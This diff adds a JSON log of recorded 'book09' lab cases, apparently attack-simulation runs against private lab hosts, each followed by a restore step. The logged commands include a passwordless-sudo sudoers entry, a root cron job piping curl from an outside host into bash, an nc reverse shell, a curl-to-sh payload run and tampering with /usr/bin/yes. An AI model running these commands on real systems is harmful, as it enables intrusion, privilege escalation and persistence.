@@ -1,0 +1,248 @@
+{
+  "case22-create": {
+    "command": "ssh -p 2204 -o ConnectTimeout=8 -o NumberOfPasswordPrompts=1 -o UserKnownHostsFile=/home/att/book09/known_hosts ccc@192.168.0.107 'test ! -e /etc/sudoers.d/99-book09-lab && printf \"%s\\n\" \"ccc ALL=(ALL) NOPASSWD:ALL\" | sudo tee /etc/sudoers.d/99-book09-lab && sudo chmod 0440 /etc/sudoers.d/99-book09-lab && sudo visudo -cf /etc/sudoers.d/99-book09-lab && sudo visudo -c'",
+    "stdout": "\rccc@192.168.0.107's password: \r\nccc ALL=(ALL) NOPASSWD:ALL\r\n/etc/sudoers.d/99-book09-lab: parsed OK\r\n/etc/sudoers: parsed OK\r\n/etc/sudoers.d/99-book09-lab: parsed OK\r\n/etc/sudoers.d/README: parsed OK\r\n/etc/sudoers.d/ccc: parsed OK\r\n",
+    "status": 0,
+    "timed_out": false,
+    "recorded_at": "2026-11-02T22:49:35.053319+00:00"
+  },
+  "case22-modify": {
+    "command": "ssh -p 2204 -o ConnectTimeout=8 -o NumberOfPasswordPrompts=1 -o UserKnownHostsFile=/home/att/book09/known_hosts ccc@192.168.0.107 'printf \"%s\\n\" \"# book09 checked\" | sudo tee -a /etc/sudoers.d/99-book09-lab; sudo visudo -cf /etc/sudoers.d/99-book09-lab; stat -c \"%a %U %G %s %n\" /etc/sudoers.d/99-book09-lab'",
+    "stdout": "\rccc@192.168.0.107's password: \r\n# book09 checked\r\n/etc/sudoers.d/99-book09-lab: parsed OK\r\n440 root root 44 /etc/sudoers.d/99-book09-lab\r\n",
+    "status": 0,
+    "timed_out": false,
+    "recorded_at": "2026-11-02T22:49:39.651991+00:00"
+  },
+  "case22-restore": {
+    "command": "docker exec kt66-bastion bash -c 'test -f /etc/sudoers.d/99-book09-lab && rm /etc/sudoers.d/99-book09-lab; test ! -e /etc/sudoers.d/99-book09-lab; echo absent=$?; visudo -c'",
+    "stdout": "absent=0\n/etc/sudoers: parsed OK\n/etc/sudoers.d/README: parsed OK\n/etc/sudoers.d/ccc: parsed OK\n",
+    "stderr": "",
+    "status": 0,
+    "recorded_at": "2026-11-02T22:49:43.958381+00:00"
+  },
+  "case23-key-login": {
+    "command": "ssh -i /home/att/book09/book09_key -o IdentitiesOnly=yes -o BatchMode=yes -o PreferredAuthentications=publickey -o UserKnownHostsFile=/home/att/book09/known_hosts -p 2204 ccc@192.168.0.107 \"hostname; id\"",
+    "stdout": "bastion\nuid=1000(ccc) gid=1000(ccc) groups=1000(ccc),27(sudo),999(docker)\n",
+    "stderr": "",
+    "status": 0,
+    "recorded_at": "2026-11-02T22:50:25.663808+00:00"
+  },
+  "case23-key-refused": {
+    "command": "ssh -i /home/att/book09/book09_key -o IdentitiesOnly=yes -o BatchMode=yes -o PreferredAuthentications=publickey -o UserKnownHostsFile=/home/att/book09/known_hosts -p 2204 ccc@192.168.0.107 \"hostname; id\"",
+    "stdout": "",
+    "stderr": "ccc@192.168.0.107: Permission denied (publickey,password).\r\n",
+    "status": 255,
+    "recorded_at": "2026-11-02T22:50:26.217530+00:00"
+  },
+  "case23-restore": {
+    "command": "docker exec kt66-bastion bash -c 'cp -p /root/book09-authorized_keys.before /home/ccc/.ssh/authorized_keys && cmp /root/book09-authorized_keys.before /home/ccc/.ssh/authorized_keys; echo cmp=$?; sha256sum /home/ccc/.ssh/authorized_keys; stat -c \"%a %U %G %n\" /home/ccc/.ssh/authorized_keys'",
+    "stdout": "cmp=0\nbd0120b8a37a90bf87b05c2a7856bd3c76e50050799739c4a94a7cfc8b6421d1  /home/ccc/.ssh/authorized_keys\n600 ccc ccc /home/ccc/.ssh/authorized_keys\n",
+    "stderr": "",
+    "status": 0,
+    "recorded_at": "2026-11-02T22:50:25.966930+00:00"
+  },
+  "case24-precheck": {
+    "command": "docker exec kt66-bastion bash -c 'hostname; command -v cron curl; pgrep -a cron; ls -l /etc/cron.d/book09-lab /tmp/book09-cron-result; curl -fsS --max-time 5 http://192.168.0.108:8000/x.sh'",
+    "stdout": "bastion\n/usr/sbin/cron\n/usr/bin/curl\n#!/bin/sh\nprintf \"book09-cron user=%s host=%s\\n\" \"$(id -un)\" \"$(hostname)\" >> /tmp/book09-cron-result\n",
+    "stderr": "ls: cannot access '/etc/cron.d/book09-lab': No such file or directory\nls: cannot access '/tmp/book09-cron-result': No such file or directory\n",
+    "status": 0,
+    "recorded_at": "2026-11-02T22:51:42.227007+00:00"
+  },
+  "case24-install-cron": {
+    "command": "docker exec kt66-bastion bash -c 'apt-get update -qq && DEBIAN_FRONTEND=noninteractive apt-get install -y -qq --no-install-recommends cron && command -v cron'",
+    "stdout": "Selecting previously unselected package cron.\r\n(Reading database ... \r(Reading database ... 5%\r(Reading database ... 10%\r(Reading database ... 15%\r(Reading database ... 20%\r(Reading database ... 25%\r(Reading database ... 30%\r(Reading database ... 35%\r(Reading database ... 40%\r(Reading database ... 45%\r(Reading database ... 50%\r(Reading database ... 55%\r(Reading database ... 60%\r(Reading database ... 65%\r(Reading database ... 70%\r(Reading database ... 75%\r(Reading database ... 80%\r(Reading database ... 85%\r(Reading database ... 90%\r(Reading database ... 95%\r(Reading database ... 100%\r(Reading database ... 15179 files and directories currently installed.)\r\nPreparing to unpack .../cron_3.0pl1-137ubuntu3_amd64.deb ...\r\nUnpacking cron (3.0pl1-137ubuntu3) ...\r\nSetting up cron (3.0pl1-137ubuntu3) ...\r\nAdding group `crontab' (GID 104) ...\r\nDone.\r\ninvoke-rc.d: could not determine current runlevel\r\ninvoke-rc.d: policy-rc.d denied execution of start.\r\n/usr/sbin/cron\n",
+    "stderr": "debconf: delaying package configuration, since apt-utils is not installed\n",
+    "status": 0,
+    "recorded_at": "2026-11-02T22:51:08.089436+00:00"
+  },
+  "case24-register": {
+    "command": "ssh -p 2204 -o ConnectTimeout=8 -o NumberOfPasswordPrompts=1 -o UserKnownHostsFile=/home/att/book09/known_hosts ccc@192.168.0.107 'test ! -e /etc/cron.d/book09-lab && printf '\"'\"'%s\\n'\"'\"' '\"'\"'* * * * * root /usr/bin/curl -fsS --max-time 5 http://192.168.0.108:8000/x.sh | /bin/bash'\"'\"' | sudo tee /etc/cron.d/book09-lab && sudo chmod 0644 /etc/cron.d/book09-lab; stat -c \"%a %U %G %n\" /etc/cron.d/book09-lab'",
+    "stdout": "\rccc@192.168.0.107's password: \r\n* * * * * root /usr/bin/curl -fsS --max-time 5 http://192.168.0.108:8000/x.sh | /bin/bash\r\n644 root root /etc/cron.d/book09-lab\r\n",
+    "status": 0,
+    "timed_out": false,
+    "recorded_at": "2026-11-02T22:51:43.007763+00:00"
+  },
+  "case24-result": {
+    "command": "docker exec kt66-bastion bash -c 'ls -l /tmp/book09-cron-result; cat /tmp/book09-cron-result; grep book09 /var/log/syslog | tail -n 6'",
+    "stdout": "-rw-r--r-- 1 root root 35 Nov  3 07:52 /tmp/book09-cron-result\nbook09-cron user=root host=bastion\n",
+    "stderr": "",
+    "status": 0,
+    "recorded_at": "2026-11-02T22:52:27.026138+00:00"
+  },
+  "case24-restore": {
+    "command": "docker exec kt66-bastion bash -c 'rm /etc/cron.d/book09-lab; service cron stop; test ! -e /etc/cron.d/book09-lab; echo cron_file_absent=$?; pgrep -a cron; ls -l /tmp/book09-cron-result'",
+    "stdout": " * Stopping periodic command scheduler cron\n   ...done.\ncron_file_absent=0\n-rw-r--r-- 1 root root 35 Nov  3 07:52 /tmp/book09-cron-result\n",
+    "stderr": "",
+    "status": 0,
+    "recorded_at": "2026-11-02T22:52:27.352528+00:00"
+  },
+  "http-requests": {
+    "command": "cat /home/att/book09/http.log; ss -ltn sport = :8000",
+    "stdout": "Serving HTTP on 192.168.0.108 port 8000 (http://192.168.0.108:8000/) ...\n192.168.0.107 - - [02/Nov/2026 22:51:42] \"GET /x.sh HTTP/1.1\" 200 -\n192.168.0.107 - - [02/Nov/2026 22:52:01] \"GET /x.sh HTTP/1.1\" 200 -\n192.168.0.107 - - [02/Nov/2026 22:53:18] \"GET /a.sh HTTP/1.1\" 200 -\n192.168.0.107 - - [02/Nov/2026 22:53:19] \"GET /a.sh HTTP/1.1\" 200 -\nState  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess\nLISTEN 0      5      192.168.0.108:8000      0.0.0.0:*          \n",
+    "stderr": "",
+    "status": 0,
+    "recorded_at": "2026-11-02T22:53:19.564550+00:00"
+  },
+  "case25-listener": {
+    "command": "timeout 45s nc -lvn 192.168.0.108 4444",
+    "sent": "hostname; id; exit",
+    "stdout": "bash: cannot set terminal process group (172434): Inappropriate ioctl for device\nbash: no job control in this shell\nccc@ccc:~$ hostname\nccc\nccc@ccc:~$ id\nuid=1000(ccc) gid=1000(ccc) groups=1000(ccc),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd)\nccc@ccc:~$ exit\nexit\n",
+    "stderr": "Listening on 192.168.0.108 4444\nConnection received on 192.168.0.107 57818\n",
+    "status": 0,
+    "recorded_at": "2026-11-02T22:52:26.543226+00:00"
+  },
+  "case25-target": {
+    "command": "ssh -p 22 -o ConnectTimeout=8 -o NumberOfPasswordPrompts=1 -o UserKnownHostsFile=/home/att/book09/known_hosts ccc@192.168.0.107 'test ! -e /tmp/book09.fifo || exit 1; mkfifo /tmp/book09.fifo; trap '\"'\"'rm -f /tmp/book09.fifo'\"'\"' EXIT; timeout 35s bash -c '\"'\"'cat /tmp/book09.fifo | bash -i 2>&1 | nc -N 192.168.0.108 4444 > /tmp/book09.fifo'\"'\"''",
+    "stdout": "\rccc@192.168.0.107's password: \r\n",
+    "status": 0,
+    "timed_out": false,
+    "recorded_at": "2026-11-02T22:52:26.449199+00:00"
+  },
+  "case25-restore": {
+    "command": "test ! -e /tmp/book09.fifo; echo fifo_absent=$?; pgrep -af \"[n]c -N 192.168.0.108 4444\"; ss -tn dst 192.168.0.108:4444",
+    "stdout": "fifo_absent=0\nState Recv-Q Send-Q Local Address:Port Peer Address:PortProcess\n",
+    "stderr": "",
+    "status": 0,
+    "recorded_at": "2026-11-02T22:52:26.745299+00:00"
+  },
+  "case26-review": {
+    "command": "ssh -p 22 -o ConnectTimeout=8 -o NumberOfPasswordPrompts=1 -o UserKnownHostsFile=/home/att/book09/known_hosts ccc@192.168.0.107 'curl -fsS --max-time 5 http://192.168.0.108:8000/a.sh'",
+    "stdout": "\rccc@192.168.0.107's password: \r\n#!/bin/sh\r\nprintf \"book09-payload user=%s host=%s\\n\" \"$(id -un)\" \"$(hostname)\"\r\n",
+    "status": 0,
+    "timed_out": false,
+    "recorded_at": "2026-11-02T22:53:18.876932+00:00"
+  },
+  "case26-execute": {
+    "command": "ssh -p 22 -o ConnectTimeout=8 -o NumberOfPasswordPrompts=1 -o UserKnownHostsFile=/home/att/book09/known_hosts ccc@192.168.0.107 'curl -fsS --max-time 5 http://192.168.0.108:8000/a.sh | sh\nprintf \"curl and sh status: %s\\n\" \"${PIPESTATUS[*]}\"'",
+    "stdout": "\rccc@192.168.0.107's password: \r\nbook09-payload user=ccc host=ccc\r\ncurl and sh status: 0 0\r\n",
+    "status": 0,
+    "timed_out": false,
+    "recorded_at": "2026-11-02T22:53:19.354331+00:00"
+  },
+  "case27-precheck": {
+    "command": "docker exec kt66-web bash -c 'hostname; ls -l /usr/bin/yes /root/book09-yes.before; readlink -f /usr/bin/yes; sha256sum /usr/bin/yes; dpkg-query -S /usr/bin/yes; dpkg -V coreutils'",
+    "stdout": "web\n-rwxr-xr-x 1 root root 31112 Aug 26 00:12 /usr/bin/yes\n/usr/bin/yes\na63b5b6bd13460b0914b8bb4f4b08a3f2587f4cbcf630d771e364344b06a40b8  /usr/bin/yes\ncoreutils: /usr/bin/yes\nmissing     /usr/share/doc/coreutils/AUTHORS\nmissing     /usr/share/doc/coreutils/NEWS.Debian.gz\nmissing     /usr/share/doc/coreutils/NEWS.gz\nmissing     /usr/share/doc/coreutils/README.Debian\nmissing     /usr/share/doc/coreutils/README.gz\nmissing     /usr/share/doc/coreutils/THANKS.gz\nmissing     /usr/share/doc/coreutils/TODO.gz\nmissing     /usr/share/man/man1/arch.1.gz\nmissing     /usr/share/man/man1/b2sum.1.gz\nmissing     /usr/share/man/man1/base32.1.gz\nmissing     /usr/share/man/man1/base64.1.gz\nmissing     /usr/share/man/man1/basename.1.gz\nmissing     /usr/share/man/man1/basenc.1.gz\nmissing     /usr/share/man/man1/cat.1.gz\nmissing     /usr/share/man/man1/chcon.1.gz\nmissing     /usr/share/man/man1/chgrp.1.gz\nmissing     /usr/share/man/man1/chmod.1.gz\nmissing     /usr/share/man/man1/chown.1.gz\nmissing     /usr/share/man/man1/cksum.1.gz\nmissing     /usr/share/man/man1/comm.1.gz\nmissing     /usr/share/man/man1/cp.1.gz\nmissing     /usr/share/man/man1/csplit.1.gz\nmissing     /usr/share/man/man1/cut.1.gz\nmissing     /usr/share/man/man1/date.1.gz\nmissing     /usr/share/man/man1/dd.1.gz\nmissing     /usr/share/man/man1/df.1.gz\nmissing     /usr/share/man/man1/dir.1.gz\nmissing     /usr/share/man/man1/dircolors.1.gz\nmissing     /usr/share/man/man1/dirname.1.gz\nmissing     /usr/share/man/man1/du.1.gz\nmissing     /usr/share/man/man1/echo.1.gz\nmissing     /usr/share/man/man1/env.1.gz\nmissing     /usr/share/man/man1/expand.1.gz\nmissing     /usr/share/man/man1/expr.1.gz\nmissing     /usr/share/man/man1/factor.1.gz\nmissing     /usr/share/man/man1/false.1.gz\nmissing     /usr/share/man/man1/fmt.1.gz\nmissing     /usr/share/man/man1/fold.1.gz\nmissing     /usr/share/man/man1/groups.1.gz\nmissing     /usr/share/man/man1/head.1.gz\nmissing     /usr/share/man/man1/hostid.1.gz\nmissing     /usr/share/man/man1/id.1.gz\nmissing     /usr/share/man/man1/install.1.gz\nmissing     /usr/share/man/man1/join.1.gz\nmissing     /usr/share/man/man1/link.1.gz\nmissing     /usr/share/man/man1/ln.1.gz\nmissing     /usr/share/man/man1/logname.1.gz\nmissing     /usr/share/man/man1/ls.1.gz\nmissing     /usr/share/man/man1/md5sum.1.gz\nmissing     /usr/share/man/man1/mkdir.1.gz\nmissing     /usr/share/man/man1/mkfifo.1.gz\nmissing     /usr/share/man/man1/mknod.1.gz\nmissing     /usr/share/man/man1/mktemp.1.gz\nmissing     /usr/share/man/man1/mv.1.gz\nmissing     /usr/share/man/man1/nice.1.gz\nmissing     /usr/share/man/man1/nl.1.gz\nmissing     /usr/share/man/man1/nohup.1.gz\nmissing     /usr/share/man/man1/nproc.1.gz\nmissing     /usr/share/man/man1/numfmt.1.gz\nmissing     /usr/share/man/man1/od.1.gz\nmissing     /usr/share/man/man1/paste.1.gz\nmissing     /usr/share/man/man1/pathchk.1.gz\nmissing     /usr/share/man/man1/pinky.1.gz\nmissing     /usr/share/man/man1/pr.1.gz\nmissing     /usr/share/man/man1/printenv.1.gz\nmissing     /usr/share/man/man1/printf.1.gz\nmissing     /usr/share/man/man1/ptx.1.gz\nmissing     /usr/share/man/man1/pwd.1.gz\nmissing     /usr/share/man/man1/readlink.1.gz\nmissing     /usr/share/man/man1/realpath.1.gz\nmissing     /usr/share/man/man1/rm.1.gz\nmissing     /usr/share/man/man1/rmdir.1.gz\nmissing     /usr/share/man/man1/runcon.1.gz\nmissing     /usr/share/man/man1/seq.1.gz\nmissing     /usr/share/man/man1/sha1sum.1.gz\nmissing     /usr/share/man/man1/sha224sum.1.gz\nmissing     /usr/share/man/man1/sha256sum.1.gz\nmissing     /usr/share/man/man1/sha384sum.1.gz\nmissing     /usr/share/man/man1/sha512sum.1.gz\nmissing     /usr/share/man/man1/shred.1.gz\nmissing     /usr/share/man/man1/shuf.1.gz\nmissing     /usr/share/man/man1/sleep.1.gz\nmissing     /usr/share/man/man1/sort.1.gz\nmissing     /usr/share/man/man1/split.1.gz\nmissing     /usr/share/man/man1/stat.1.gz\nmissing     /usr/share/man/man1/stdbuf.1.gz\nmissing     /usr/share/man/man1/stty.1.gz\nmissing     /usr/share/man/man1/sum.1.gz\nmissing     /usr/share/man/man1/sync.1.gz\nmissing     /usr/share/man/man1/tac.1.gz\nmissing     /usr/share/man/man1/tail.1.gz\nmissing     /usr/share/man/man1/tee.1.gz\nmissing     /usr/share/man/man1/test.1.gz\nmissing     /usr/share/man/man1/timeout.1.gz\nmissing     /usr/share/man/man1/touch.1.gz\nmissing     /usr/share/man/man1/tr.1.gz\nmissing     /usr/share/man/man1/true.1.gz\nmissing     /usr/share/man/man1/truncate.1.gz\nmissing     /usr/share/man/man1/tsort.1.gz\nmissing     /usr/share/man/man1/tty.1.gz\nmissing     /usr/share/man/man1/uname.1.gz\nmissing     /usr/share/man/man1/unexpand.1.gz\nmissing     /usr/share/man/man1/uniq.1.gz\nmissing     /usr/share/man/man1/unlink.1.gz\nmissing     /usr/share/man/man1/users.1.gz\nmissing     /usr/share/man/man1/vdir.1.gz\nmissing     /usr/share/man/man1/wc.1.gz\nmissing     /usr/share/man/man1/who.1.gz\nmissing     /usr/share/man/man1/whoami.1.gz\nmissing     /usr/share/man/man1/yes.1.gz\nmissing     /usr/share/man/man8/chroot.8.gz\nmissing     /usr/share/man/man1/[.1.gz\nmissing     /usr/share/man/man1/md5sum.textutils.1.gz\n",
+    "stderr": "ls: cannot access '/root/book09-yes.before': No such file or directory\n",
+    "status": 0,
+    "recorded_at": "2026-11-02T22:53:19.898079+00:00"
+  },
+  "case27-modify": {
+    "command": "docker exec kt66-web bash -c 'printf '\"'\"'\\x00BOOK09'\"'\"' >> /usr/bin/yes; sha256sum /usr/bin/yes /root/book09-yes.before; stat -c '\"'\"'%s %n'\"'\"' /usr/bin/yes; dpkg -V coreutils'",
+    "stdout": "a6505c8ce87a35aa66ced72b526acc8df8c358d52ad11d7d5ea9947fafd0c462  /usr/bin/yes\na63b5b6bd13460b0914b8bb4f4b08a3f2587f4cbcf630d771e364344b06a40b8  /root/book09-yes.before\n31119 /usr/bin/yes\n??5??????   /usr/bin/yes\nmissing     /usr/share/doc/coreutils/AUTHORS\nmissing     /usr/share/doc/coreutils/NEWS.Debian.gz\nmissing     /usr/share/doc/coreutils/NEWS.gz\nmissing     /usr/share/doc/coreutils/README.Debian\nmissing     /usr/share/doc/coreutils/README.gz\nmissing     /usr/share/doc/coreutils/THANKS.gz\nmissing     /usr/share/doc/coreutils/TODO.gz\nmissing     /usr/share/man/man1/arch.1.gz\nmissing     /usr/share/man/man1/b2sum.1.gz\nmissing     /usr/share/man/man1/base32.1.gz\nmissing     /usr/share/man/man1/base64.1.gz\nmissing     /usr/share/man/man1/basename.1.gz\nmissing     /usr/share/man/man1/basenc.1.gz\nmissing     /usr/share/man/man1/cat.1.gz\nmissing     /usr/share/man/man1/chcon.1.gz\nmissing     /usr/share/man/man1/chgrp.1.gz\nmissing     /usr/share/man/man1/chmod.1.gz\nmissing     /usr/share/man/man1/chown.1.gz\nmissing     /usr/share/man/man1/cksum.1.gz\nmissing     /usr/share/man/man1/comm.1.gz\nmissing     /usr/share/man/man1/cp.1.gz\nmissing     /usr/share/man/man1/csplit.1.gz\nmissing     /usr/share/man/man1/cut.1.gz\nmissing     /usr/share/man/man1/date.1.gz\nmissing     /usr/share/man/man1/dd.1.gz\nmissing     /usr/share/man/man1/df.1.gz\nmissing     /usr/share/man/man1/dir.1.gz\nmissing     /usr/share/man/man1/dircolors.1.gz\nmissing     /usr/share/man/man1/dirname.1.gz\nmissing     /usr/share/man/man1/du.1.gz\nmissing     /usr/share/man/man1/echo.1.gz\nmissing     /usr/share/man/man1/env.1.gz\nmissing     /usr/share/man/man1/expand.1.gz\nmissing     /usr/share/man/man1/expr.1.gz\nmissing     /usr/share/man/man1/factor.1.gz\nmissing     /usr/share/man/man1/false.1.gz\nmissing     /usr/share/man/man1/fmt.1.gz\nmissing     /usr/share/man/man1/fold.1.gz\nmissing     /usr/share/man/man1/groups.1.gz\nmissing     /usr/share/man/man1/head.1.gz\nmissing     /usr/share/man/man1/hostid.1.gz\nmissing     /usr/share/man/man1/id.1.gz\nmissing     /usr/share/man/man1/install.1.gz\nmissing     /usr/share/man/man1/join.1.gz\nmissing     /usr/share/man/man1/link.1.gz\nmissing     /usr/share/man/man1/ln.1.gz\nmissing     /usr/share/man/man1/logname.1.gz\nmissing     /usr/share/man/man1/ls.1.gz\nmissing     /usr/share/man/man1/md5sum.1.gz\nmissing     /usr/share/man/man1/mkdir.1.gz\nmissing     /usr/share/man/man1/mkfifo.1.gz\nmissing     /usr/share/man/man1/mknod.1.gz\nmissing     /usr/share/man/man1/mktemp.1.gz\nmissing     /usr/share/man/man1/mv.1.gz\nmissing     /usr/share/man/man1/nice.1.gz\nmissing     /usr/share/man/man1/nl.1.gz\nmissing     /usr/share/man/man1/nohup.1.gz\nmissing     /usr/share/man/man1/nproc.1.gz\nmissing     /usr/share/man/man1/numfmt.1.gz\nmissing     /usr/share/man/man1/od.1.gz\nmissing     /usr/share/man/man1/paste.1.gz\nmissing     /usr/share/man/man1/pathchk.1.gz\nmissing     /usr/share/man/man1/pinky.1.gz\nmissing     /usr/share/man/man1/pr.1.gz\nmissing     /usr/share/man/man1/printenv.1.gz\nmissing     /usr/share/man/man1/printf.1.gz\nmissing     /usr/share/man/man1/ptx.1.gz\nmissing     /usr/share/man/man1/pwd.1.gz\nmissing     /usr/share/man/man1/readlink.1.gz\nmissing     /usr/share/man/man1/realpath.1.gz\nmissing     /usr/share/man/man1/rm.1.gz\nmissing     /usr/share/man/man1/rmdir.1.gz\nmissing     /usr/share/man/man1/runcon.1.gz\nmissing     /usr/share/man/man1/seq.1.gz\nmissing     /usr/share/man/man1/sha1sum.1.gz\nmissing     /usr/share/man/man1/sha224sum.1.gz\nmissing     /usr/share/man/man1/sha256sum.1.gz\nmissing     /usr/share/man/man1/sha384sum.1.gz\nmissing     /usr/share/man/man1/sha512sum.1.gz\nmissing     /usr/share/man/man1/shred.1.gz\nmissing     /usr/share/man/man1/shuf.1.gz\nmissing     /usr/share/man/man1/sleep.1.gz\nmissing     /usr/share/man/man1/sort.1.gz\nmissing     /usr/share/man/man1/split.1.gz\nmissing     /usr/share/man/man1/stat.1.gz\nmissing     /usr/share/man/man1/stdbuf.1.gz\nmissing     /usr/share/man/man1/stty.1.gz\nmissing     /usr/share/man/man1/sum.1.gz\nmissing     /usr/share/man/man1/sync.1.gz\nmissing     /usr/share/man/man1/tac.1.gz\nmissing     /usr/share/man/man1/tail.1.gz\nmissing     /usr/share/man/man1/tee.1.gz\nmissing     /usr/share/man/man1/test.1.gz\nmissing     /usr/share/man/man1/timeout.1.gz\nmissing     /usr/share/man/man1/touch.1.gz\nmissing     /usr/share/man/man1/tr.1.gz\nmissing     /usr/share/man/man1/true.1.gz\nmissing     /usr/share/man/man1/truncate.1.gz\nmissing     /usr/share/man/man1/tsort.1.gz\nmissing     /usr/share/man/man1/tty.1.gz\nmissing     /usr/share/man/man1/uname.1.gz\nmissing     /usr/share/man/man1/unexpand.1.gz\nmissing     /usr/share/man/man1/uniq.1.gz\nmissing     /usr/share/man/man1/unlink.1.gz\nmissing     /usr/share/man/man1/users.1.gz\nmissing     /usr/share/man/man1/vdir.1.gz\nmissing     /usr/share/man/man1/wc.1.gz\nmissing     /usr/share/man/man1/who.1.gz\nmissing     /usr/share/man/man1/whoami.1.gz\nmissing     /usr/share/man/man1/yes.1.gz\nmissing     /usr/share/man/man8/chroot.8.gz\nmissing     /usr/share/man/man1/[.1.gz\nmissing     /usr/share/man/man1/md5sum.textutils.1.gz\n",
+    "stderr": "",
+    "status": 0,
+    "recorded_at": "2026-11-02T22:53:20.509065+00:00"
+  },
+  "case27-restore": {
+    "command": "docker exec kt66-web bash -c 'cp -p /root/book09-yes.before /usr/bin/yes && cmp /root/book09-yes.before /usr/bin/yes; echo cmp=$?; sha256sum /usr/bin/yes; stat -c \"%a %U %G %s %n\" /usr/bin/yes; dpkg -V coreutils'",
+    "stdout": "cmp=0\na63b5b6bd13460b0914b8bb4f4b08a3f2587f4cbcf630d771e364344b06a40b8  /usr/bin/yes\n755 root root 31112 /usr/bin/yes\nmissing     /usr/share/doc/coreutils/AUTHORS\nmissing     /usr/share/doc/coreutils/NEWS.Debian.gz\nmissing     /usr/share/doc/coreutils/NEWS.gz\nmissing     /usr/share/doc/coreutils/README.Debian\nmissing     /usr/share/doc/coreutils/README.gz\nmissing     /usr/share/doc/coreutils/THANKS.gz\nmissing     /usr/share/doc/coreutils/TODO.gz\nmissing     /usr/share/man/man1/arch.1.gz\nmissing     /usr/share/man/man1/b2sum.1.gz\nmissing     /usr/share/man/man1/base32.1.gz\nmissing     /usr/share/man/man1/base64.1.gz\nmissing     /usr/share/man/man1/basename.1.gz\nmissing     /usr/share/man/man1/basenc.1.gz\nmissing     /usr/share/man/man1/cat.1.gz\nmissing     /usr/share/man/man1/chcon.1.gz\nmissing     /usr/share/man/man1/chgrp.1.gz\nmissing     /usr/share/man/man1/chmod.1.gz\nmissing     /usr/share/man/man1/chown.1.gz\nmissing     /usr/share/man/man1/cksum.1.gz\nmissing     /usr/share/man/man1/comm.1.gz\nmissing     /usr/share/man/man1/cp.1.gz\nmissing     /usr/share/man/man1/csplit.1.gz\nmissing     /usr/share/man/man1/cut.1.gz\nmissing     /usr/share/man/man1/date.1.gz\nmissing     /usr/share/man/man1/dd.1.gz\nmissing     /usr/share/man/man1/df.1.gz\nmissing     /usr/share/man/man1/dir.1.gz\nmissing     /usr/share/man/man1/dircolors.1.gz\nmissing     /usr/share/man/man1/dirname.1.gz\nmissing     /usr/share/man/man1/du.1.gz\nmissing     /usr/share/man/man1/echo.1.gz\nmissing     /usr/share/man/man1/env.1.gz\nmissing     /usr/share/man/man1/expand.1.gz\nmissing     /usr/share/man/man1/expr.1.gz\nmissing     /usr/share/man/man1/factor.1.gz\nmissing     /usr/share/man/man1/false.1.gz\nmissing     /usr/share/man/man1/fmt.1.gz\nmissing     /usr/share/man/man1/fold.1.gz\nmissing     /usr/share/man/man1/groups.1.gz\nmissing     /usr/share/man/man1/head.1.gz\nmissing     /usr/share/man/man1/hostid.1.gz\nmissing     /usr/share/man/man1/id.1.gz\nmissing     /usr/share/man/man1/install.1.gz\nmissing     /usr/share/man/man1/join.1.gz\nmissing     /usr/share/man/man1/link.1.gz\nmissing     /usr/share/man/man1/ln.1.gz\nmissing     /usr/share/man/man1/logname.1.gz\nmissing     /usr/share/man/man1/ls.1.gz\nmissing     /usr/share/man/man1/md5sum.1.gz\nmissing     /usr/share/man/man1/mkdir.1.gz\nmissing     /usr/share/man/man1/mkfifo.1.gz\nmissing     /usr/share/man/man1/mknod.1.gz\nmissing     /usr/share/man/man1/mktemp.1.gz\nmissing     /usr/share/man/man1/mv.1.gz\nmissing     /usr/share/man/man1/nice.1.gz\nmissing     /usr/share/man/man1/nl.1.gz\nmissing     /usr/share/man/man1/nohup.1.gz\nmissing     /usr/share/man/man1/nproc.1.gz\nmissing     /usr/share/man/man1/numfmt.1.gz\nmissing     /usr/share/man/man1/od.1.gz\nmissing     /usr/share/man/man1/paste.1.gz\nmissing     /usr/share/man/man1/pathchk.1.gz\nmissing     /usr/share/man/man1/pinky.1.gz\nmissing     /usr/share/man/man1/pr.1.gz\nmissing     /usr/share/man/man1/printenv.1.gz\nmissing     /usr/share/man/man1/printf.1.gz\nmissing     /usr/share/man/man1/ptx.1.gz\nmissing     /usr/share/man/man1/pwd.1.gz\nmissing     /usr/share/man/man1/readlink.1.gz\nmissing     /usr/share/man/man1/realpath.1.gz\nmissing     /usr/share/man/man1/rm.1.gz\nmissing     /usr/share/man/man1/rmdir.1.gz\nmissing     /usr/share/man/man1/runcon.1.gz\nmissing     /usr/share/man/man1/seq.1.gz\nmissing     /usr/share/man/man1/sha1sum.1.gz\nmissing     /usr/share/man/man1/sha224sum.1.gz\nmissing     /usr/share/man/man1/sha256sum.1.gz\nmissing     /usr/share/man/man1/sha384sum.1.gz\nmissing     /usr/share/man/man1/sha512sum.1.gz\nmissing     /usr/share/man/man1/shred.1.gz\nmissing     /usr/share/man/man1/shuf.1.gz\nmissing     /usr/share/man/man1/sleep.1.gz\nmissing     /usr/share/man/man1/sort.1.gz\nmissing     /usr/share/man/man1/split.1.gz\nmissing     /usr/share/man/man1/stat.1.gz\nmissing     /usr/share/man/man1/stdbuf.1.gz\nmissing     /usr/share/man/man1/stty.1.gz\nmissing     /usr/share/man/man1/sum.1.gz\nmissing     /usr/share/man/man1/sync.1.gz\nmissing     /usr/share/man/man1/tac.1.gz\nmissing     /usr/share/man/man1/tail.1.gz\nmissing     /usr/share/man/man1/tee.1.gz\nmissing     /usr/share/man/man1/test.1.gz\nmissing     /usr/share/man/man1/timeout.1.gz\nmissing     /usr/share/man/man1/touch.1.gz\nmissing     /usr/share/man/man1/tr.1.gz\nmissing     /usr/share/man/man1/true.1.gz\nmissing     /usr/share/man/man1/truncate.1.gz\nmissing     /usr/share/man/man1/tsort.1.gz\nmissing     /usr/share/man/man1/tty.1.gz\nmissing     /usr/share/man/man1/uname.1.gz\nmissing     /usr/share/man/man1/unexpand.1.gz\nmissing     /usr/share/man/man1/uniq.1.gz\nmissing     /usr/share/man/man1/unlink.1.gz\nmissing     /usr/share/man/man1/users.1.gz\nmissing     /usr/share/man/man1/vdir.1.gz\nmissing     /usr/share/man/man1/wc.1.gz\nmissing     /usr/share/man/man1/who.1.gz\nmissing     /usr/share/man/man1/whoami.1.gz\nmissing     /usr/share/man/man1/yes.1.gz\nmissing     /usr/share/man/man8/chroot.8.gz\nmissing     /usr/share/man/man1/[.1.gz\nmissing     /usr/share/man/man1/md5sum.textutils.1.gz\n",
+    "stderr": "",
+    "status": 0,
+    "recorded_at": "2026-11-02T22:53:25.825746+00:00"
+  },
+  "case28-precheck": {
